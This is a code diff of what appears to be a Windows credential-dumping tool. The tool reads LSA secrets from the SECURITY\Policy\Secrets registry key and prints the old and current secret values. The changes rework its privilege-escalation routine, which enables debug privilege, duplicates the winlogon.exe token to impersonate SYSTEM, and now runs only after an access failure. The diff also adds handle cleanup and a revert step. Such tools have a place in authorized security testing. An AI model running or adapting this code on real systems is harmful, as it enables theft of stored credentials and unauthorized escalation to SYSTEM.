@@ -118,22 +118,20 @@ void read_secret(TCHAR* szSecretName)
 	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
 	_tprintf(_T("    Old secret: %s\r\n"), puOldVal->Buffer);
 	FileTimeToSystemTime(&liOupdTime, &systemtime);
-	_tprintf(_T("         DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
+	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
 	LsaClose(lsahSecretHandle);
 	LsaClose(lsahLocalPolicy);
 }
 
 
-TCHAR* pszSecretsSubkeyPath = _T("SECURITY\\Policy\\Secrets");
-TCHAR* pszTestKeyPath = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
-TCHAR* pszTestKeyName = _T("__GT__Decrypt");
-
-BOOL SetPrivilege(HANDLE hToken,LPCTSTR lpszPrivilege){
+BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
+{
 
 	TOKEN_PRIVILEGES tp;
 	LUID luid;
 
-	if (!LookupPrivilegeValue(NULL,lpszPrivilege,   &luid))   {
+	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
+	{
 		_tprintf(_T("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
 		return FALSE;
 	}
@@ -142,60 +140,76 @@ BOOL SetPrivilege(HANDLE hToken,LPCTSTR lpszPrivilege){
 	tp.Privileges[0].Luid = luid;
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-	if (!AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)){
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
+	{
 		_tprintf(_T("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
 		return FALSE;
 	}
 
-	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
 		_tprintf(_T("[-] The token does not have the specified privilege. %u\n"), GetLastError());
 		return FALSE;
 	}
 	return TRUE;
 }
 
-DWORD getWinLogonPID(){
-	PROCESSENTRY32 entry;
-	entry.dwSize = sizeof(PROCESSENTRY32);
+
+DWORD getWinLogonPID()
+{
+	PROCESSENTRY32W entry;
+	entry.dwSize = sizeof(PROCESSENTRY32W);
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (Process32First(snapshot, &entry) == TRUE)
+	if (TRUE == Process32FirstW(snapshot, &entry))
 	{
-		while (Process32Next(snapshot, &entry) == TRUE)
+		while (TRUE == Process32NextW(snapshot, &entry))
 		{
-			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
+			if (0 == wcscmp(entry.szExeFile, L"winlogon.exe"))
 			{
 				_tprintf(_T("Winlogon PID Found %d\n"), entry.th32ProcessID);
 				return entry.th32ProcessID;
 			}
 		}
 	}
-	return -1;
-
+	return 0;
 }
 
-BOOL elevateSystem() {
+
+BOOL elevateSystem()
+{
 	HANDLE currentTokenHandle = NULL;
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
-	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME)){
-		_tprintf(_T("SetPrivilege Enable Error  %u\n"), GetLastError());
+	BOOL getCurrentToken;
+	getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
+	if (!getCurrentToken)
+	{
+		_tprintf(_T("OpenProcessToken() Error  %u\n"), GetLastError());
+		return FALSE;
+	}
+	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME))
+	{
+		_tprintf(_T("SetPrivilege() Enable Error  %u\n"), GetLastError());
 		return FALSE;
 	}
 	HANDLE processHandle;
 	HANDLE tokenHandle = NULL;
 	HANDLE duplicateTokenHandle = NULL;
 	DWORD pidToImpersonate;
-	if ((pidToImpersonate = getWinLogonPID()) < 0) {
+	pidToImpersonate = getWinLogonPID();
+	if (0 == pidToImpersonate)
+	{
 		_tprintf(_T("PID of winlogon not found\n"));
 		return FALSE;
 	}
 	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
-	if (GetLastError() != NULL) {
-		_tprintf(_T("OpenProcess Error %u\n"),GetLastError());
+	if (NULL == processHandle)
+	{
+		_tprintf(_T("OpenProcess Error %u\n"), GetLastError());
 		return FALSE;
 	}
-	;
-	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle)) {
-		_tprintf(_T("OpenProcessToken Error %u\n"),GetLastError());
+	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
+	{
+		_tprintf(_T("OpenProcessToken Error %u\n"), GetLastError());
+		CloseHandle(processHandle);
 		return FALSE;
 	}
 	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
@@ -203,14 +217,29 @@ BOOL elevateSystem() {
 	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
 	{
 		_tprintf(_T("DuplicateTokenEx Error %u\n"), GetLastError());
+		CloseHandle(processHandle);
+		CloseHandle(tokenHandle);
 		return FALSE;
 	}
-	if (!ImpersonateLoggedOnUser(duplicateTokenHandle)) {
+	if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
+	{
 		_tprintf(_T("Impersonate Logged On User Error %u\n"), GetLastError());
+		CloseHandle(duplicateTokenHandle);
+		CloseHandle(tokenHandle);
+		CloseHandle(processHandle);
 		return FALSE;
 	}
+	CloseHandle(duplicateTokenHandle);
+	CloseHandle(tokenHandle);
+	CloseHandle(processHandle);
 	return TRUE;
 }
+
+
+TCHAR* pszSecretsSubkeyPath = _T("SECURITY\\Policy\\Secrets");
+TCHAR* pszTestKeyPath = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
+TCHAR* pszTestKeyName = _T("__GT__Decrypt");
+
 
 int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 {
@@ -221,9 +250,7 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 	FILETIME ftLastWriteTime; // last write time 
 	LSTATUS Status;
 	SYSTEMTIME systemtime;
-	if (!elevateSystem()) {
-		return -1;
-	}
+
 	pszTestedSecretFullKeyPath = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR));
 	if (NULL == pszTestedSecretFullKeyPath)
 	{
@@ -238,9 +265,27 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 
 	if (ERROR_SUCCESS != Status)
 	{
-		_tprintf(_T("\r\nCannot open HKLM\\%s.\r\nAre you NT AUTHORITY\\SYSTEM?\r\n"), pszSecretsSubkeyPath);
-		return -2;
+		_tprintf(_T("\r\nCannot open HKLM\\%s.\r\nTrying to impersonate as NT AUTHORITY\\SYSTEM...\r\n"), pszSecretsSubkeyPath);
+		if (!elevateSystem())
+		{
+			_tprintf(_T("\r\nCannot elevate. Try to re-launch the tool as Admin or NT AUTHORITY\\SYSTEM\r\n"));
+			return -2;
+		}
+
+		//should be elevated here, let's open again
+		Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+			pszSecretsSubkeyPath,
+			0,
+			KEY_READ,
+			&hTestKey);
+
+		if (ERROR_SUCCESS != Status)
+		{
+			_tprintf(_T("\r\nStill cannot open HKLM\\%s.\r\nExiting...\r\n"), pszSecretsSubkeyPath);
+			return -3;
+		}
 	}
+
 
 	DWORD retCode;
 	// Get the value count. 
@@ -310,5 +355,6 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 
 	RegCloseKey(hTestKey);
 	LocalFree(pszTestedSecretFullKeyPath);
+	RevertToSelf();
 	return 0;
 }
